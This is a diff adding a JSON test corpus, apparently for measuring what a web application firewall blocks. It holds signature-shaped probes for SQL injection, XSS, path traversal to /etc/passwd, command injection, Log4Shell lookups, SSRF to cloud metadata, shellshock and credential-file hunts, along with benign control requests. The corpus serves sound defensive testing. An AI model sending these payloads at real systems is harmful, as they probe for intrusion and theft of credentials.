@@ -1,0 +1,710 @@
+{
+  "_meta": {
+    "name": "WAF efficacy corpus",
+    "purpose": "Signature-shaped but BENIGN probes to measure what a WAF layer catches vs lets through. Nothing here exploits anything: payloads target non-existent/benign paths, point at RFC-invalid sinks (.invalid), and carry a test marker. No credential stuffing, no real webshell bodies, no volumetric flooding.",
+    "profile_source": "a representative production WAF detection distribution (30-day sample)",
+    "verdict_semantics": "expect=block -> a WAF SHOULD stop it; counting these as PASSED = attack-signature got through. expect=pass -> legitimate traffic; counting these as BLOCKED = false positive.",
+    "weighting": "weight mirrors the observed 30d category volume so a weighted sample resembles real attack traffic",
+    "payload_safety": "All sinks are .invalid or benign markers; traversal targets /etc/passwd only as a *string* against a path that 404s; JNDI/SSRF point at non-resolving .invalid hosts; command/code-injection use harmless tokens (id, phpinfo-as-string) never destructive commands."
+  },
+  "probes": [
+    {
+      "id": "sqli-01",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "id": "1' OR '1'='1"
+      },
+      "expect": "block",
+      "note": "classic boolean SQLi in query"
+    },
+    {
+      "id": "sqli-02",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "id": "1 UNION SELECT username,password FROM users-- -"
+      },
+      "expect": "block",
+      "note": "UNION extraction"
+    },
+    {
+      "id": "sqli-03",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "GET",
+      "path": "/search",
+      "query": {
+        "q": "1); DROP TABLE x-- "
+      },
+      "expect": "block",
+      "note": "stacked (benign table name)"
+    },
+    {
+      "id": "sqli-04",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "GET",
+      "path": "/",
+      "expect": "block",
+      "note": "URL-encoded boolean SQLi",
+      "raw_query": "id=1%27%20OR%20%271%27%3D%271"
+    },
+    {
+      "id": "sqli-05",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "POST",
+      "path": "/login",
+      "body": "username=admin&password=x' OR 1=1-- ",
+      "content_type": "application/x-www-form-urlencoded",
+      "expect": "block",
+      "note": "body-form SQLi (the batch/v1-style query-vs-body lesson)"
+    },
+    {
+      "id": "sqli-06",
+      "category": "sqli",
+      "weight": 1055,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "id": "1 AND (SELECT 1 FROM (SELECT SLEEP(0))x)"
+      },
+      "expect": "block",
+      "note": "time-based (SLEEP 0 = no actual delay)"
+    },
+    {
+      "id": "xss-01",
+      "category": "xss",
+      "weight": 740,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "q": "<script>alert(1)</script>"
+      },
+      "expect": "block",
+      "note": "reflected script tag"
+    },
+    {
+      "id": "xss-02",
+      "category": "xss",
+      "weight": 740,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "q": "\"><img src=x onerror=alert(1)>"
+      },
+      "expect": "block",
+      "note": "attribute-breakout img onerror"
+    },
+    {
+      "id": "xss-03",
+      "category": "xss",
+      "weight": 740,
+      "method": "GET",
+      "path": "/",
+      "expect": "block",
+      "note": "URL-encoded script",
+      "raw_query": "q=%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+    },
+    {
+      "id": "xss-04",
+      "category": "xss",
+      "weight": 740,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "q": "<svg/onload=alert(1)>"
+      },
+      "expect": "block",
+      "note": "svg onload"
+    },
+    {
+      "id": "xss-05",
+      "category": "xss",
+      "weight": 740,
+      "method": "POST",
+      "path": "/comment",
+      "body": "body=<script>alert(document.cookie)</script>",
+      "content_type": "application/x-www-form-urlencoded",
+      "expect": "block",
+      "note": "stored-style XSS in body"
+    },
+    {
+      "id": "lfi-01",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "file": "../../../../etc/passwd"
+      },
+      "expect": "block",
+      "note": "directory traversal to /etc/passwd (path 404s; string match only)"
+    },
+    {
+      "id": "lfi-02",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "page": "....//....//....//etc/passwd"
+      },
+      "expect": "block",
+      "note": "dot-slash obfuscation"
+    },
+    {
+      "id": "lfi-03",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "expect": "block",
+      "note": "URL-encoded traversal",
+      "raw_query": "file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
+    },
+    {
+      "id": "lfi-04",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "file": "php://filter/convert.base64-encode/resource=index"
+      },
+      "expect": "block",
+      "note": "php:// wrapper"
+    },
+    {
+      "id": "rfi-01",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "page": "http://waf-test.invalid/shell.txt"
+      },
+      "expect": "block",
+      "note": "remote include from .invalid (non-resolving)"
+    },
+    {
+      "id": "lfi-05",
+      "category": "file_include",
+      "weight": 2315,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "file": "..%c0%af..%c0%af..%c0%afetc/passwd"
+      },
+      "expect": "block",
+      "note": "overlong-UTF8 traversal"
+    },
+    {
+      "id": "cmd-01",
+      "category": "cmd_injection",
+      "weight": 2032,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "host": "127.0.0.1;id"
+      },
+      "expect": "block",
+      "note": "command separator + id (benign)"
+    },
+    {
+      "id": "cmd-02",
+      "category": "cmd_injection",
+      "weight": 2032,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "cmd": "$(id)"
+      },
+      "expect": "block",
+      "note": "command substitution"
+    },
+    {
+      "id": "cmd-03",
+      "category": "cmd_injection",
+      "weight": 2032,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "ping": "8.8.8.8|cat /etc/passwd"
+      },
+      "expect": "block",
+      "note": "pipe to cat (string only)"
+    },
+    {
+      "id": "cmd-04",
+      "category": "cmd_injection",
+      "weight": 2032,
+      "method": "GET",
+      "path": "/",
+      "expect": "block",
+      "note": "URL-encoded separator",
+      "raw_query": "x=%3Bid"
+    },
+    {
+      "id": "cmd-05",
+      "category": "cmd_injection",
+      "weight": 2032,
+      "method": "POST",
+      "path": "/api/run",
+      "body": "input=`id`",
+      "content_type": "application/x-www-form-urlencoded",
+      "expect": "block",
+      "note": "backtick in body"
+    },
+    {
+      "id": "phpci-01",
+      "category": "php_code_injection",
+      "weight": 830,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "page": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
+      },
+      "expect": "block",
+      "note": "data:// base64 of <?php phpinfo();?> (benign info call)"
+    },
+    {
+      "id": "phpci-02",
+      "category": "php_code_injection",
+      "weight": 830,
+      "method": "POST",
+      "path": "/",
+      "body": "<?php echo 'wafqa';?>",
+      "content_type": "text/plain",
+      "expect": "block",
+      "note": "php:// input style body, prints marker only"
+    },
+    {
+      "id": "phpci-03",
+      "category": "php_code_injection",
+      "weight": 830,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "call": "call_user_func_array('phpinfo',[])"
+      },
+      "expect": "block",
+      "note": "dynamic call to phpinfo (benign)"
+    },
+    {
+      "id": "phpci-04",
+      "category": "php_code_injection",
+      "weight": 830,
+      "method": "GET",
+      "path": "/index.php",
+      "query": {
+        "0": "phpinfo",
+        "cmd": "1"
+      },
+      "expect": "block",
+      "note": "eval-stdin / func-name param style"
+    },
+    {
+      "id": "jndi-01",
+      "category": "java_jndi",
+      "weight": 130,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "x": "${jndi:ldap://waf-test.invalid/a}"
+      },
+      "expect": "block",
+      "note": "Log4Shell in query, sink is non-resolving .invalid"
+    },
+    {
+      "id": "jndi-02",
+      "category": "java_jndi",
+      "weight": 130,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "User-Agent": "${jndi:ldap://waf-test.invalid/ua}"
+      },
+      "expect": "block",
+      "note": "Log4Shell in User-Agent header"
+    },
+    {
+      "id": "jndi-03",
+      "category": "java_jndi",
+      "weight": 130,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "X-Api-Version": "${${lower:jndi}:${lower:ldap}://waf-test.invalid/o}"
+      },
+      "expect": "block",
+      "note": "obfuscated lookup nesting"
+    },
+    {
+      "id": "deser-01",
+      "category": "deserialization",
+      "weight": 71,
+      "method": "POST",
+      "path": "/",
+      "body": "O:8:\"stdClass\":0:{}",
+      "content_type": "application/x-www-form-urlencoded",
+      "expect": "block",
+      "note": "PHP serialized object probe (empty stdClass, benign)"
+    },
+    {
+      "id": "deser-02",
+      "category": "deserialization",
+      "weight": 71,
+      "method": "POST",
+      "path": "/",
+      "body": "rO0ABXNyABF",
+      "content_type": "application/octet-stream",
+      "expect": "block",
+      "note": "Java serialized stream magic (truncated, benign)"
+    },
+    {
+      "id": "ssrf-01",
+      "category": "ssrf",
+      "weight": 50,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "url": "http://169.254.169.254/latest/meta-data/"
+      },
+      "expect": "block",
+      "note": "cloud metadata SSRF target"
+    },
+    {
+      "id": "ssrf-02",
+      "category": "ssrf",
+      "weight": 50,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "url": "http://127.0.0.1:22/"
+      },
+      "expect": "block",
+      "note": "internal port SSRF"
+    },
+    {
+      "id": "ssti-01",
+      "category": "ssti",
+      "weight": 13,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "name": "{{7*7}}"
+      },
+      "expect": "block",
+      "note": "template injection probe"
+    },
+    {
+      "id": "ssti-02",
+      "category": "ssti",
+      "weight": 13,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "name": "${7*7}"
+      },
+      "expect": "block",
+      "note": "EL-style template injection"
+    },
+    {
+      "id": "cflucee-01",
+      "category": "cf_lucee",
+      "weight": 400,
+      "method": "GET",
+      "path": "/CFIDE/adminapi/administrator.cfc",
+      "query": {
+        "method": "login",
+        "adminpassword": "wafqa"
+      },
+      "expect": "block",
+      "note": "ColdFusion/Lucee adminapi login-bypass probe (ColdFusion/CFML admin surface)"
+    },
+    {
+      "id": "cflucee-02",
+      "category": "cf_lucee",
+      "weight": 400,
+      "method": "GET",
+      "path": "/CFIDE/administrator/enter.cfm",
+      "expect": "block",
+      "note": "CF administrator console probe"
+    },
+    {
+      "id": "cflucee-03",
+      "category": "cf_lucee",
+      "weight": 400,
+      "method": "GET",
+      "path": "/lucee/admin/web.cfm",
+      "expect": "block",
+      "note": "Lucee admin console"
+    },
+    {
+      "id": "cflucee-04",
+      "category": "cf_lucee",
+      "weight": 400,
+      "method": "GET",
+      "path": "/CFIDE/wizards/common/_logintowizard.cfm",
+      "expect": "block",
+      "note": "wizardHash login probe seen live in production"
+    },
+    {
+      "id": "cred-01",
+      "category": "cred_hunt",
+      "weight": 300,
+      "method": "GET",
+      "path": "/.env",
+      "expect": "block",
+      "note": "dotenv secret hunt"
+    },
+    {
+      "id": "cred-02",
+      "category": "cred_hunt",
+      "weight": 300,
+      "method": "GET",
+      "path": "/.git/config",
+      "expect": "block",
+      "note": "exposed git config"
+    },
+    {
+      "id": "cred-03",
+      "category": "cred_hunt",
+      "weight": 300,
+      "method": "GET",
+      "path": "/.aws/credentials",
+      "expect": "block",
+      "note": "aws creds hunt"
+    },
+    {
+      "id": "cred-04",
+      "category": "cred_hunt",
+      "weight": 300,
+      "method": "GET",
+      "path": "/config/gcp-credentials.json",
+      "expect": "block",
+      "note": "gcp creds hunt"
+    },
+    {
+      "id": "cred-05",
+      "category": "cred_hunt",
+      "weight": 300,
+      "method": "GET",
+      "path": "/server-status",
+      "expect": "block",
+      "note": "apache status info leak"
+    },
+    {
+      "id": "trav-01",
+      "category": "traversal",
+      "weight": 300,
+      "method": "GET",
+      "path": "/static/..%2f..%2f..%2f..%2fetc%2fpasswd",
+      "expect": "block",
+      "note": "path-segment traversal (not query param)"
+    },
+    {
+      "id": "trav-02",
+      "category": "traversal",
+      "weight": 300,
+      "method": "GET",
+      "path": "/download",
+      "query": {
+        "f": "..\\..\\..\\windows\\win.ini"
+      },
+      "expect": "block",
+      "note": "windows traversal"
+    },
+    {
+      "id": "wp-01",
+      "category": "wp_probe",
+      "weight": 200,
+      "method": "GET",
+      "path": "/wp-login.php",
+      "expect": "block",
+      "note": "wp login probe (the origin is not WordPress; should be blocked/irrelevant)"
+    },
+    {
+      "id": "wp-02",
+      "category": "wp_probe",
+      "weight": 200,
+      "method": "POST",
+      "path": "/wp-json/wp/v2/users",
+      "body": "{}",
+      "content_type": "application/json",
+      "expect": "block",
+      "note": "wp rest user enum"
+    },
+    {
+      "id": "wp-03",
+      "category": "wp_probe",
+      "weight": 200,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "rest_route": "/wp/v2/users"
+      },
+      "expect": "block",
+      "note": "rest_route query form (the 88%-of-traffic query-string vector)"
+    },
+    {
+      "id": "wp-04",
+      "category": "wp_probe",
+      "weight": 200,
+      "method": "GET",
+      "path": "/xmlrpc.php",
+      "expect": "block",
+      "note": "xmlrpc probe"
+    },
+    {
+      "id": "scan-01",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/actuator/env",
+      "expect": "block",
+      "note": "spring actuator env"
+    },
+    {
+      "id": "scan-02",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/HNAP1/",
+      "expect": "block",
+      "note": "HNAP router probe"
+    },
+    {
+      "id": "scan-03",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/cgi-bin/.%2e/.%2e/.%2e/bin/sh",
+      "expect": "block",
+      "note": "shellshock-style cgi probe"
+    },
+    {
+      "id": "scan-04",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "User-Agent": "() { :;}; echo wafqa"
+      },
+      "expect": "block",
+      "note": "shellshock UA (benign echo)"
+    },
+    {
+      "id": "scan-05",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "User-Agent": "Mozilla/5.00 (Nikto/2.1.6)"
+      },
+      "expect": "block",
+      "note": "nikto scanner UA"
+    },
+    {
+      "id": "scan-06",
+      "category": "scanner",
+      "weight": 350,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "User-Agent": "Nmap Scripting Engine; https://nmap.org/book/nse.html"
+      },
+      "expect": "block",
+      "note": "the Nmap NSE UA seen in observed scan floods"
+    },
+    {
+      "id": "php-01",
+      "category": "php_exploit",
+      "weight": 200,
+      "method": "GET",
+      "path": "/phpmyadmin/index.php",
+      "expect": "block",
+      "note": "phpmyadmin discovery"
+    },
+    {
+      "id": "php-02",
+      "category": "php_exploit",
+      "weight": 200,
+      "method": "GET",
+      "path": "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
+      "expect": "block",
+      "note": "CVE-2017-9841 eval-stdin path"
+    },
+    {
+      "id": "ctrl-01",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/",
+      "expect": "pass",
+      "note": "homepage must load"
+    },
+    {
+      "id": "ctrl-02",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/robots.txt",
+      "expect": "pass",
+      "note": "robots must load"
+    },
+    {
+      "id": "ctrl-03",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/favicon.ico",
+      "expect": "pass",
+      "note": "static asset must load"
+    },
+    {
+      "id": "ctrl-04",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "q": "a normal search query"
+      },
+      "expect": "pass",
+      "note": "normal search query must pass"
+    },
+    {
+      "id": "ctrl-05",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/",
+      "query": {
+        "page": "about-us"
+      },
+      "expect": "pass",
+      "note": "benign page param must pass"
+    },
+    {
+      "id": "ctrl-06",
+      "category": "control",
+      "weight": 0,
+      "method": "GET",
+      "path": "/",
+      "headers": {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0 Safari/537.36"
+      },
+      "expect": "pass",
+      "note": "normal browser UA must pass"
+    }
+  ]
+}
